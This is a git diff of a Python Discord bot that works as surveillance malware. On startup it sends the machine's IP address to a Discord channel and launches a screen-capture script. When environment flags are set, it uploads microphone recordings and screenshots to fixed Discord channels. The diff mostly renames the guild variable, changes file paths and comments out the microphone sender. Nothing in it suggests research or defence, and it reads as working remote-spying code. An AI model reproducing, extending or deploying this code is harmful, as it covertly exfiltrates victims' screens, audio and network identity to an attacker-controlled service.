@@ -4,13 +4,14 @@ import os
 import socket
 import time
 import subprocess
+import pyautogui
 from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=';', intents=intents)
-guild = "1198070162432200865"
+guild_id = "1198070162432200865"
 screenshot_channel = "1209205802032955413"
 microphone_channel = "1209237919592615937"
 connect_channel = "1209247219874668638"
@@ -24,8 +25,8 @@ async def listen():
         runScreen = os.getenv('runScreen')
         
         if runMic == "True":
-            mic_path = f"files\\{time.strftime('%H:%M:%S')}.wav"
-            guild = await bot.fetch_guild(guild)
+            mic_path = Microphone.name
+            guild = await bot.fetch_guild(guild_id)
             channel = await guild.fetch_channel(microphone_channel)
 
             with open(mic_path, "rb") as mic_file:
@@ -34,8 +35,8 @@ async def listen():
             Microphone.update_env('runMic', 'False')
 
         if runScreen == "True":
-            screenshot_path = f"files\\{time.strftime('%H:%M:%S')}.png"
-            guild = await bot.fetch_guild(guild)
+            screenshot_path = Screenshot.name
+            guild = await bot.fetch_guild(guild_id)
             channel = await guild.fetch_channel(screenshot_channel)
 
             with open(screenshot_path, 'rb') as screenshot_file:
@@ -47,16 +48,16 @@ async def listen():
 
 @bot.event
 async def on_ready():
-    guild = await bot.fetch_guild(guild)
+    guild = await bot.fetch_guild(guild_id)
     channel = await guild.fetch_channel(connect_channel)
 
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
 
-    await channel.send(f"{ip_address} connected at {time.strftime('%H:%M:%S')}")
+    await channel.send(f"{ip_address} connected at {time.strftime('%D:%H:%M:%S')}")
 
-    subprocess.run(["python", "mic_sender.py"])
-    subprocess.run(["python", "screen_sender.py"])
+    # subprocess.run(["python", "src\\mic_sender.py"])
+    subprocess.run(["python", "src\\screen_sender.py"])
     await listen()
 
 bot.run(os.getenv("TOKEN"))
